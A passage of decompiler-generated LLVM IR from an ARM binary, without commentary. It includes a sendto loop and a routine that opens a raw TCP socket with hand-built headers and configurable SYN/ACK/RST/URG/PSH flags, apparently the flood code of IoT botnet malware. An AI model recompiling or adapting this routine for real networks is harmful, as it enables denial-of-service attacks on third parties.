  store i8 %v1_d2f8, i8* %v4_d2f8, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_d300 = load i32, i32* @r5, align 4
  store i32 %v0_d300, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-168.0.ph, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_d310 = load i32, i32* %ip.global-to-local, align 4
  %v4_d310 = inttoptr i32 %v0_d310 to %sockaddr*
  %v7_d318 = inttoptr i32 %v0_d300 to i32*
  %v9_d318 = call i32 @sendto(i32 %v3_cf00, i32* %v7_d318, i32 %stack_var_-168.0.ph, i32 16384, %sockaddr* %v4_d310, i32 16)
  %v3_d31c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d31c, i32* %r3.global-to-local, align 4
  %v1_d320 = add i32 %v3_d31c, 1
  %v0_d324 = load i32, i32* @fp, align 4
  %v9_d324 = icmp eq i32 %v0_d324, %v1_d320
  store i1 %v9_d324, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d320, i32* %stack_var_-40, align 4
  %v7_d32c = icmp sgt i32 %v0_d324, %v1_d320
  br i1 %v7_d32c, label %dec_label_pc_d210, label %dec_label_pc_d1e8

dec_label_pc_d334:                                ; preds = %dec_label_pc_cf10
  %v1_d338 = call i32 @close(i32 %v3_cf00)
  br label %dec_label_pc_d33c

dec_label_pc_d33c:                                ; preds = %dec_label_pc_ccfc, %dec_label_pc_d334
  %v29_d340 = phi i32 [ %v3_cf00, %dec_label_pc_ccfc ], [ %v1_d338, %dec_label_pc_d334 ]
  store i32 %v3_ccfc, i32* %r4.global-to-local, align 4
  ret i32 %v29_d340

dec_label_pc_d344:                                ; preds = %dec_label_pc_d210
  %v1_d344 = add i32 %v2_d218, 16
  %v2_d344 = inttoptr i32 %v1_d344 to i32*
  %v3_d344 = load i32, i32* %v2_d344, align 4
  store i32 %v3_d344, i32* %r4.global-to-local, align 4
  %v0_d348 = call i32 @function_10bd8()
  %v3_d34c = load i32, i32* %stack_var_-40, align 4
  %v5_d354 = mul i32 %v3_d34c, 24
  %v1_d35c = load i32, i32* @sb, align 4
  %v2_d35c = add i32 %v1_d35c, %v5_d354
  store i32 %v2_d35c, i32* %r1.global-to-local, align 4
  %v1_d360 = and i32 %v3_d344, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %v1_d360, i32* %r3.global-to-local, align 4
  %v1_d358 = udiv i32 %v3_d344, 256
  %v3_d364 = and i32 %v1_d358, 65280
  store i32 %v3_d364, i32* %r2.global-to-local, align 4
  %v3_d368 = mul i32 %v3_d344, 16777216
  store i32 %v3_d368, i32* %ip.global-to-local, align 4
  %v1_d36c = add i32 %v2_d35c, 20
  %v2_d36c = inttoptr i32 %v1_d36c to i8*
  %v3_d36c = load i8, i8* %v2_d36c, align 1
  %v4_d36c = zext i8 %v3_d36c to i32
  %v4_d370 = mul i32 %v1_d360, 256
  %v5_d370 = or i32 %v4_d370, %v3_d368
  store i32 %v5_d370, i32* %ip.global-to-local, align 4
  %v4_d374 = udiv i32 %v3_d344, 16777216
  %v5_d374 = or i32 %v3_d364, %v4_d374
  %v2_d378 = or i32 %v5_d374, %v5_d370
  %v7_d37c = lshr i32 %v0_d348, %v4_d36c
  %v8_d37c = add i32 %v7_d37c, %v2_d378
  store i32 %v8_d37c, i32* %r2.global-to-local, align 4
  %v2_d398 = call i32 @llvm.bswap.i32(i32 %v8_d37c)
  store i32 %v2_d398, i32* %r3.global-to-local, align 4
  store i32 %v6_ceec, i32* %r1.global-to-local, align 4
  store i1 %v8_d3a0, i1* %cpsr_z.global-to-local, align 1
  %v1_d3a4 = load i32, i32* @r5, align 4
  %v2_d3a4 = add i32 %v1_d3a4, 16
  %v3_d3a4 = inttoptr i32 %v2_d3a4 to i32*
  store i32 %v2_d398, i32* %v3_d3a4, align 4
  br i1 %v3_d3a0, label %dec_label_pc_d3ac, label %dec_label_pc_d240

dec_label_pc_d3ac:                                ; preds = %dec_label_pc_d344, %dec_label_pc_d234
  %v0_d3ac = call i32 @function_10bd8()
  store i32 %v3_cf48, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d3bc, i1* %cpsr_z.global-to-local, align 1
  %v1_d3c0 = load i32, i32* @r5, align 4
  %v2_d3c0 = add i32 %v1_d3c0, 12
  %v3_d3c0 = inttoptr i32 %v2_d3c0 to i32*
  store i32 %v0_d3ac, i32* %v3_d3c0, align 4
  br i1 %v3_d3bc, label %dec_label_pc_d3c8, label %dec_label_pc_d3ac.dec_label_pc_d254_crit_edge

dec_label_pc_d3ac.dec_label_pc_d254_crit_edge:    ; preds = %dec_label_pc_d3ac
  %v1_d258.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d254

dec_label_pc_d3c8:                                ; preds = %dec_label_pc_d3ac, %dec_label_pc_d240
  %v0_d3c8 = call i32 @function_10bd8()
  %v1_d3c8 = trunc i32 %v0_d3c8 to i8
  %v4_d3cc31 = udiv i32 %v0_d3c8, 256
  %v1_d3d0 = trunc i32 %v4_d3cc31 to i8
  %v2_d3d0 = load i32, i32* @r5, align 4
  %v3_d3d0 = add i32 %v2_d3d0, 5
  %v4_d3d0 = inttoptr i32 %v3_d3d0 to i8*
  store i8 %v1_d3d0, i8* %v4_d3d0, align 1
  store i32 %v3_cf4c, i32* %r3.global-to-local, align 4
  %v1_d3d8 = load i32, i32* @r4, align 4
  %v9_d3d8 = icmp eq i32 %v3_cf4c, %v1_d3d8
  store i1 %v9_d3d8, i1* %cpsr_z.global-to-local, align 1
  %v3_d3dc = load i32, i32* @r5, align 4
  %v4_d3dc = add i32 %v3_d3dc, 4
  %v5_d3dc = inttoptr i32 %v4_d3dc to i8*
  store i8 %v1_d3c8, i8* %v5_d3dc, align 1
  %v0_d3e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3e0, label %dec_label_pc_d3e4, label %dec_label_pc_d3c8.dec_label_pc_d260_crit_edge

dec_label_pc_d3c8.dec_label_pc_d260_crit_edge:    ; preds = %dec_label_pc_d3c8
  %v1_d264.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d260

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3c8, %dec_label_pc_d254
  %v0_d3e4 = call i32 @function_10bd8()
  %v1_d3e4 = trunc i32 %v0_d3e4 to i8
  store i32 %v3_cf50, i32* %ip.global-to-local, align 4
  %v4_d3ec = sdiv i32 %v0_d3e4, 256
  store i32 %v4_d3ec, i32* %r3.global-to-local, align 4
  %v1_d3f0 = load i32, i32* @r4, align 4
  %v9_d3f0 = icmp eq i32 %v3_cf50, %v1_d3f0
  store i1 %v9_d3f0, i1* %cpsr_z.global-to-local, align 1
  %v3_d3f4 = load i32, i32* @r5, align 4
  %v4_d3f4 = add i32 %v3_d3f4, 20
  %v5_d3f4 = inttoptr i32 %v4_d3f4 to i8*
  store i8 %v1_d3e4, i8* %v5_d3f4, align 1
  %v0_d3f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d3f8 = trunc i32 %v0_d3f8 to i8
  %v2_d3f8 = load i32, i32* @r6, align 4
  %v3_d3f8 = add i32 %v2_d3f8, 1
  %v4_d3f8 = inttoptr i32 %v3_d3f8 to i8*
  store i8 %v1_d3f8, i8* %v4_d3f8, align 1
  %v0_d3fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3fc, label %dec_label_pc_d400, label %dec_label_pc_d3e4.dec_label_pc_d26c_crit_edge

dec_label_pc_d3e4.dec_label_pc_d26c_crit_edge:    ; preds = %dec_label_pc_d3e4
  %v1_d270.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d26c

dec_label_pc_d400:                                ; preds = %dec_label_pc_d3e4, %dec_label_pc_d260
  %v0_d400 = call i32 @function_10bd8()
  %v1_d400 = trunc i32 %v0_d400 to i8
  store i32 %v5_cdec, i32* %r1.global-to-local, align 4
  %v4_d408 = sdiv i32 %v0_d400, 256
  store i32 %v4_d408, i32* %r3.global-to-local, align 4
  %v1_d40c = load i32, i32* @r4, align 4
  %v9_d40c = icmp eq i32 %v5_cdec, %v1_d40c
  store i1 %v9_d40c, i1* %cpsr_z.global-to-local, align 1
  %v1_d410 = trunc i32 %v4_d408 to i8
  %v2_d410 = load i32, i32* @r6, align 4
  %v3_d410 = add i32 %v2_d410, 3
  %v4_d410 = inttoptr i32 %v3_d410 to i8*
  store i8 %v1_d410, i8* %v4_d410, align 1
  %v3_d414 = load i32, i32* @r6, align 4
  %v4_d414 = add i32 %v3_d414, 2
  %v5_d414 = inttoptr i32 %v4_d414 to i8*
  store i8 %v1_d400, i8* %v5_d414, align 1
  %v0_d418 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d418, label %dec_label_pc_d41c, label %dec_label_pc_d400.dec_label_pc_d278_crit_edge

dec_label_pc_d400.dec_label_pc_d278_crit_edge:    ; preds = %dec_label_pc_d400
  %v1_d27c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d278

dec_label_pc_d41c:                                ; preds = %dec_label_pc_d400, %dec_label_pc_d26c
  %v0_d41c = call i32 @function_10bd8()
  store i32 %v6_ce08, i32* %r2.global-to-local, align 4
  %v1_d424 = load i32, i32* @r4, align 4
  %v9_d424 = icmp eq i32 %v6_ce08, %v1_d424
  store i1 %v9_d424, i1* %cpsr_z.global-to-local, align 1
  %v1_d428 = load i32, i32* @r6, align 4
  %v2_d428 = add i32 %v1_d428, 4
  %v3_d428 = inttoptr i32 %v2_d428 to i32*
  store i32 %v0_d41c, i32* %v3_d428, align 4
  br i1 %v9_d424, label %dec_label_pc_d430, label %dec_label_pc_d284

dec_label_pc_d430:                                ; preds = %dec_label_pc_d41c, %dec_label_pc_d278
  %v0_d430 = call i32 @function_10bd8()
  store i32 %v1_ced8, i32* %r3.global-to-local, align 4
  store i1 %v2_d438, i1* %cpsr_z.global-to-local, align 1
  %v1_d43c = load i32, i32* @r6, align 4
  %v2_d43c = add i32 %v1_d43c, 8
  %v3_d43c = inttoptr i32 %v2_d43c to i32*
  store i32 %v0_d430, i32* %v3_d43c, align 4
  br i1 %v2_d438, label %dec_label_pc_d290, label %dec_label_pc_d444

dec_label_pc_d444:                                ; preds = %dec_label_pc_d284, %dec_label_pc_d430
  %v0_d444 = load i32, i32* @r5, align 4
  %v1_d444 = add i32 %v0_d444, 40
  store i32 %v6_ceb0, i32* @r1, align 4
  %v1_d44c = inttoptr i32 %v1_d444 to i8*
  %v2_d44c = call i32 @function_10db4(i8* %v1_d44c)
  br label %dec_label_pc_d290

dec_label_pc_d454:                                ; preds = %dec_label_pc_cf38
  store i32 %v6_ceb0, i32* %r3.global-to-local, align 4
  %v1_d45c = add i32 %v6_ceb0, 40
  store i32 %v1_d45c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d1e8.preheader

; uselistorder directives
  uselistorder i32 %v1_d45c, { 1, 0 }
  uselistorder i32 %v4_d408, { 1, 0 }
  uselistorder i32 %v2_d398, { 1, 0 }
  uselistorder i32 %v3_d368, { 1, 0 }
  uselistorder i32 %v3_d344, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_d324, { 1, 2, 0 }
  uselistorder i32 %v1_d320, { 2, 0, 3, 1 }
  uselistorder i32 %v0_d2b0, { 1, 0, 2 }
  uselistorder i32 %v0_d1f4, { 2, 0, 1 }
  uselistorder i32 %v0_d1e8, { 1, 0 }
  uselistorder i1 %v2_d438, { 2, 3, 1, 0 }
  uselistorder i1 %v3_d3bc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_d1d0, { 1, 0, 2, 3 }
  uselistorder i8 %v5_d034, { 1, 0 }
  uselistorder i32 %v1_cffc, { 1, 0 }
  uselistorder i32 %v1_cff8, { 1, 0 }
  uselistorder i32 %v1_cff4, { 1, 0 }
  uselistorder i32 %v1_cfd0, { 1, 0 }
  uselistorder i32 %v1_cfcc, { 1, 0 }
  uselistorder i32 %v1_cfc8, { 1, 0 }
  uselistorder i32 %v1_cfbc, { 1, 0 }
  uselistorder i32 %v1_cf98, { 1, 0 }
  uselistorder i32 %v1_cf88, { 1, 0 }
  uselistorder i32 %v1_cf74, { 2, 1, 0 }
  uselistorder i32 %v0_cf54, { 1, 0, 2 }
  uselistorder i32 %v3_cf48, { 0, 1, 3, 2 }
  uselistorder i32 %v0_cf3c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_cf38, { 0, 2, 1, 3 }
  uselistorder i1 %v7_cf30, { 1, 0 }
  uselistorder i1 %v7_cf04, { 1, 0 }
  uselistorder i32 %v3_cf00, { 1, 2, 3, 0 }
  uselistorder i32 %v6_ceec, { 4, 3, 0, 5, 1, 2 }
  uselistorder i32 %v1_ced8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_ceb0, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32 %v6_ce08, { 3, 2, 1, 0 }
  uselistorder i32 %v5_cdec, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 %v1_cd9c, { 1, 0 }
  uselistorder i32 %v6_cd34, { 1, 0 }
  uselistorder i32 %v2_cd1c, { 0, 3, 1, 2 }
  uselistorder i32 %v1_cd00, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 37, 35, 36, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 16, 17, 18, 19, 20, 21, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 39, 38, 10, 11, 12, 13, 15, 14, 17, 16, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 9, 10, 11 }
  uselistorder label %dec_label_pc_d444, { 1, 0 }
  uselistorder label %dec_label_pc_d33c, { 1, 0 }
  uselistorder label %dec_label_pc_d290, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d1e8.preheader, { 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_d470(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d470:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_d470 = load i32, i32* @r4, align 4
  %v6_d470 = load i32, i32* @r5, align 4
  %v9_d470 = load i32, i32* @r6, align 4
  %v12_d470 = load i32, i32* @r7, align 4
  %v1_d474 = urem i32 %arg1, 256
  store i32 %v1_d474, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_d474, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_d48c = urem i32 %arg3, 256
  store i32 %v1_d48c, i32* @r4, align 4
  %v2_d490 = call i32 @_calloc(i32 %v1_d474, i32 4)
  %v0_d494 = load i32, i32* @r5, align 4
  store i32 %v0_d494, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d490, i32* %fp.global-to-local, align 4
  %v0_d4a4 = load i32, i32* @r4, align 4
  store i32 %v0_d4a4, i32* %r0.global-to-local, align 4
  %v4_d4a8 = inttoptr i32 %v0_d494 to i32*
  %v5_d4a8 = call i32 @function_b240(i32 %v0_d4a4, i32* %v4_d4a8, i32 2, i32 0)
  %v1_d4b4 = urem i32 %v5_d4a8, 256
  store i32 %v1_d4b4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d4c0 = load i32, i32* @r5, align 4
  store i32 %v0_d4c0, i32* %r1.global-to-local, align 4
  %v0_d4c4 = load i32, i32* @r4, align 4
  store i32 %v0_d4c4, i32* %r0.global-to-local, align 4
  %v5_d4c8 = trunc i32 %v5_d4a8 to i8
  %v6_d4cc = inttoptr i32 %v0_d4c0 to i32*
  %v7_d4cc = call i32 @function_b240(i32 %v0_d4c4, i32* %v6_d4cc, i32 3, i32 65535)
  %v0_d4d0 = load i32, i32* @r5, align 4
  store i32 %v0_d4d0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d4e0 = load i32, i32* @r4, align 4
  store i32 %v0_d4e0, i32* %r0.global-to-local, align 4
  %v5_d4e4 = inttoptr i32 %v0_d4d0 to i32*
  %v6_d4e4 = call i32 @function_b240(i32 %v0_d4e0, i32* %v5_d4e4, i32 4, i32 64)
  %v1_d4ec = urem i32 %v6_d4e4, 256
  store i32 %v1_d4ec, i32* %ip.global-to-local, align 4
  %v0_d4f0 = load i32, i32* @r5, align 4
  store i32 %v0_d4f0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d4fc = load i32, i32* @r4, align 4
  store i32 %v0_d4fc, i32* %r0.global-to-local, align 4
  %v6_d504 = inttoptr i32 %v0_d4f0 to i32*
  %v7_d504 = call i32 @function_b240(i32 %v0_d4fc, i32* %v6_d504, i32 5, i32 1)
  %v1_d510 = urem i32 %v7_d504, 256
  store i32 %v1_d510, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d51c = load i32, i32* @r5, align 4
  store i32 %v0_d51c, i32* %r1.global-to-local, align 4
  %v0_d520 = load i32, i32* @r4, align 4
  store i32 %v0_d520, i32* %r0.global-to-local, align 4
  %v5_d528 = inttoptr i32 %v0_d51c to i32*
  %v6_d528 = call i32 @function_b240(i32 %v0_d520, i32* %v5_d528, i32 6, i32 65535)
  %v0_d530 = load i32, i32* @r5, align 4
  store i32 %v0_d530, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_d528, i32* @r7, align 4
  %v0_d540 = load i32, i32* @r4, align 4
  store i32 %v0_d540, i32* %r0.global-to-local, align 4
  %v4_d544 = inttoptr i32 %v0_d530 to i32*
  %v5_d544 = call i32 @function_b240(i32 %v0_d540, i32* %v4_d544, i32 7, i32 65535)
  %v0_d54c = load i32, i32* @r5, align 4
  store i32 %v0_d54c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_d544, i32* @r6, align 4
  %v0_d55c = load i32, i32* @r4, align 4
  store i32 %v0_d55c, i32* %r0.global-to-local, align 4
  %v4_d560 = inttoptr i32 %v0_d54c to i32*
  %v5_d560 = call i32 @function_b240(i32 %v0_d55c, i32* %v4_d560, i32 17, i32 65535)
  %v0_d564 = load i32, i32* @r5, align 4
  store i32 %v0_d564, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d574 = load i32, i32* @r4, align 4
  store i32 %v0_d574, i32* %r0.global-to-local, align 4
  %v5_d578 = inttoptr i32 %v0_d564 to i32*
  %v6_d578 = call i32 @function_b240(i32 %v0_d574, i32* %v5_d578, i32 18, i32 0)
  %v0_d57c = load i32, i32* @r5, align 4
  store i32 %v0_d57c, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d58c = load i32, i32* @r4, align 4
  store i32 %v0_d58c, i32* %r0.global-to-local, align 4
  %v5_d590 = inttoptr i32 %v0_d57c to i32*
  %v6_d590 = call i32 @function_b240(i32 %v0_d58c, i32* %v5_d590, i32 11, i32 0)
  %v0_d594 = load i32, i32* @r5, align 4
  store i32 %v0_d594, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d5a4 = load i32, i32* @r4, align 4
  store i32 %v0_d5a4, i32* %r0.global-to-local, align 4
  %v5_d5a8 = inttoptr i32 %v0_d594 to i32*
  %v6_d5a8 = call i32 @function_b240(i32 %v0_d5a4, i32* %v5_d5a8, i32 12, i32 0)
  %v0_d5ac = load i32, i32* @r5, align 4
  store i32 %v0_d5ac, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d5bc = load i32, i32* @r4, align 4
  store i32 %v0_d5bc, i32* %r0.global-to-local, align 4
  %v5_d5c0 = inttoptr i32 %v0_d5ac to i32*
  %v6_d5c0 = call i32 @function_b240(i32 %v0_d5bc, i32* %v5_d5c0, i32 13, i32 0)
  %v0_d5c4 = load i32, i32* @r5, align 4
  store i32 %v0_d5c4, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d5d4 = load i32, i32* @r4, align 4
  store i32 %v0_d5d4, i32* %r0.global-to-local, align 4
  %v5_d5d8 = inttoptr i32 %v0_d5c4 to i32*
  %v6_d5d8 = call i32 @function_b240(i32 %v0_d5d4, i32* %v5_d5d8, i32 14, i32 0)
  %v0_d5dc = load i32, i32* @r5, align 4
  store i32 %v0_d5dc, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d5ec = load i32, i32* @r4, align 4
  store i32 %v0_d5ec, i32* %r0.global-to-local, align 4
  %v5_d5f0 = inttoptr i32 %v0_d5dc to i32*
  %v6_d5f0 = call i32 @function_b240(i32 %v0_d5ec, i32* %v5_d5f0, i32 15, i32 1)
  %v0_d5f4 = load i32, i32* @r5, align 4
  store i32 %v0_d5f4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d604 = load i32, i32* @r4, align 4
  store i32 %v0_d604, i32* %r0.global-to-local, align 4
  %v5_d608 = inttoptr i32 %v0_d5f4 to i32*
  %v6_d608 = call i32 @function_b240(i32 %v0_d604, i32* %v5_d608, i32 16, i32 0)
  %v2_d614 = load i32, i32* @global_var_1cdf4.141, align 4
  store i32 %v2_d614, i32* %r3.global-to-local, align 4
  %v0_d618 = load i32, i32* @r5, align 4
  store i32 %v0_d618, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_d620 = load i32, i32* @r4, align 4
  store i32 %v0_d620, i32* %r0.global-to-local, align 4
  %v5_d624 = inttoptr i32 %v0_d618 to i32*
  %v6_d624 = call i32 @function_b1d4(i32 %v0_d620, i32* %v5_d624, i32 25, i32 %v2_d614, i32 %v6_d608)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d638 = call i32 @_socket(i32 2, i32 3, i32 6)
  store i32 %v3_d638, i32* %r0.global-to-local, align 4
  %v7_d63c = icmp eq i32 %v3_d638, -1
  store i1 %v7_d63c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d638, i32* %sb.global-to-local, align 4
  br i1 %v7_d63c, label %dec_label_pc_dba8, label %dec_label_pc_d648

dec_label_pc_d648:                                ; preds = %dec_label_pc_d470
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d650 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d650, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d664 = call i32 @_setsockopt()
  store i32 %v0_d664, i32* %r0.global-to-local, align 4
  %v7_d668 = icmp eq i32 %v0_d664, -1
  store i1 %v7_d668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d668, label %dec_label_pc_dba0, label %dec_label_pc_d670

dec_label_pc_d670:                                ; preds = %dec_label_pc_d648
  store i32 0, i32* %stack_var_-40, align 4
  %v0_d684 = load i32, i32* @r7, align 4
  %v3_d684 = mul i32 %v0_d684, 65536
  store i32 %v3_d684, i32* %r4.global-to-local, align 4
  %v0_d688 = load i32, i32* @r6, align 4
  %v3_d688 = mul i32 %v0_d688, 65536
  store i32 %v3_d688, i32* %r5.global-to-local, align 4
  %v3_d68c = urem i32 %v7_d4cc, 65536
  store i32 %v3_d68c, i32* %r3.global-to-local, align 4
  %v3_d690 = urem i32 %v0_d684, 65536
  store i32 %v3_d690, i32* %ip.global-to-local, align 4
  %v3_d694 = urem i32 %v0_d688, 65536
  store i32 %v3_d694, i32* %r0.global-to-local, align 4
  %v1_d698 = urem i32 %v6_d590, 256
  store i32 %v1_d698, i32* %r2.global-to-local, align 4
  %v0_d69c = load i32, i32* @sl, align 4
  %v2_d69c = icmp eq i32 %v0_d69c, 0
  store i1 %v2_d69c, i1* %cpsr_z.global-to-local, align 1
  %tmp70 = icmp slt i32 %v0_d69c, 1
  br i1 %tmp70, label %dec_label_pc_d94c, label %dec_label_pc_d6b4

dec_label_pc_d6b4:                                ; preds = %dec_label_pc_d670
  %v1_d6c4 = urem i32 %v0_d684, 256
  %v1_d6cc = urem i32 %v7_d4cc, 256
  %v1_d6d0 = urem i32 %v0_d688, 256
  %tmp71 = mul i32 %v5_d560, 256
  %v3_d6d8 = mul nuw nsw i32 %v1_d6d0, 256
  %v1_d6dc = and i32 %tmp71, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  %tmp72 = udiv i32 %v0_d688, 256
  %v4_d6e0 = urem i32 %tmp72, 256
  %v5_d6e0 = or i32 %v4_d6e0, %v3_d6d8
  store i32 %v5_d6e0, i32* %r6.global-to-local, align 4
  %tmp73 = udiv i32 %v5_d560, 256
  %v4_d6e4 = urem i32 %tmp73, 256
  %v5_d6e4 = or i32 %v4_d6e4, %v1_d6dc
  store i32 %v5_d6e4, i32* %r5.global-to-local, align 4
  %v1_d6f4 = urem i32 %v6_d590, 2
  %tmp74 = udiv i32 %v7_d4cc, 256
  %v1_d6fc = urem i32 %v6_d5a8, 2
  %v3_d70c = mul nuw nsw i32 %v1_d6c4, 256
  store i32 %v3_d70c, i32* %r1.global-to-local, align 4
  %tmp75 = udiv i32 %v0_d684, 256
  %v4_d718 = urem i32 %tmp75, 256
  %v5_d718 = or i32 %v4_d718, %v3_d70c
  store i32 %v5_d718, i32* %r7.global-to-local, align 4
  %v1_d71c = urem i32 %v6_d5c0, 2
  %v1_d720 = urem i32 %v6_d5d8, 2
  %v1_d724 = urem i32 %v6_d5f0, 2
  %v1_d734 = urem i32 %v6_d608, 2
  store i32 %v1_d734, i32* %r0.global-to-local, align 4
  store i32 %v1_d6cc, i32* %r2.global-to-local, align 4
  store i32 %v1_d6c4, i32* %r3.global-to-local, align 4
  store i32 %v1_d6d0, i32* %ip.global-to-local, align 4
  %v5_d744 = trunc i32 %tmp74 to i8
  %v5_d754 = trunc i32 %v0_d688 to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %sext = mul i32 %v6_d4e4, 16777216
  %v4_d7a4 = sdiv i32 %sext, 16777216
  %sext9 = mul i32 %v7_d4cc, 16777216
  %v4_d7bc = sdiv i32 %sext9, 16777216
  %tmp = sub nsw i32 0, %v1_d6f4
  %v4_d818 = and i32 %tmp, 32
  %tmp79 = sub nsw i32 0, %v1_d6fc
  %v4_d82c = and i32 %tmp79, 16
  %tmp80 = sub nsw i32 0, %v1_d71c
  %v4_d840 = and i32 %tmp80, 8
  %tmp81 = sub nsw i32 0, %v1_d720
  %v4_d854 = and i32 %tmp81, 4
  %tmp82 = sub nsw i32 0, %v1_d724
  %v3_d868 = and i32 %tmp82, 2
  %v7_d898 = sext i8 %v5_d754 to i32
  %sext78 = mul i32 %v0_d684, 16777216
  %v3_d898 = sdiv i32 %sext78, 16777216
  br label %dec_label_pc_d75c

dec_label_pc_d75c:                                ; preds = %bb77, %dec_label_pc_d6b4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
